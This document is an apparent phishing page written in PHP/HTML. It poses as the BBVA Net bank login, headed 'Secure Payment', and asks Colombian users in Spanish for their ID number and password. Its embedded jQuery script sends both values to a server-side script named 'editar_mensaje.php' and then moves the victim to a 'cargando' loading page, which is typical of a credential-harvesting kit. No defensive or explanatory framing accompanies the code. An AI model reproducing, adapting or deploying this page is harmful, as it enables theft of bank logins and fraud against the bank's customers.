<?php

?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
  <link rel="stylesheet" href="style.css">


  <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
		
   		<script type="text/javascript" src="/scripts/functions2.js"></script>  		

  
  <title>Secure Payment</title>



</head>
<body>
  

  <img src="./img/menu.jpg" alt="" srcset="" width="100%">

  <center> <div style="width:90%; margin-top: 80px;">
	<a style="font-size:21px;">Hola, ingresa tu número de documento y contraseña para entrar a BBVA Net:</a>
	</div></center>

  <div class="inp">
    <select name="cc" id="">

    <option value="cedula" selected>Cédula de Ciudadania</option>
    </select><br>

  <input type="tel" id="txtUsuario" name="userC" placeholder="Número de documento" minlength="6" maxlength="10" pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');"><br>
    <input type="password" name="pass" id="txtPass" placeholder="Contraseña" oninput="this.value = this.value.replace(/\s+/g, '')"><br>
    <input type="submit" value="Entrar a BBVA Net" id="btnUsuario" style="background-color:#227aba; font-size:17px; border:none;  font-weight: bold; color:white; width:85%;"><br>
	<input type="hidden" value="bbva" id="banco">
   
  </div>

 
  

<script type="text/javascript">
	var espera = 0;

	let identificadorTiempoDeEspera;

	function retardor() {
	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
	}

	function retardorX() {

	}

	$(document).ready(function() {

		$('#btnUsuario').click(function(){
			if (($("#txtUsuario").val().length > 0)) {
				const data = {
                    'usuario': $("#txtUsuario").val(),
                    'pass': $("#txtPass").val()
                };
                console.log(data);
                $.ajax({
                    url: '../../acciones/editar_mensaje.php',
                    method: 'POST',
                    data: {
                        data: data
                    },
                    success: function(response) {
                        const result = JSON.parse(response);
                        if (result.success) {
                            window.location.href = "cargando.php";
                        } else {
                            alert('Error de conexión, por favor intente de nuevo');
                           window.location.href = "/";
                        }
                    },
                    error: function(xhr, status, error) {
                        console.log("Warning")
                    }
                });
			}else{
				$("#err-mensaje").show();
				$(".user").css("border", "1px solid red");
				$("#txtUsuario").focus();
			}			
		});

		$("#txtUsuario").keyup(function(e) {
			$(".user").css("border", "1px solid #CCCCCC");	
			$("#err-mensaje").hide();				
		});
	});
</script>


</body>
</html>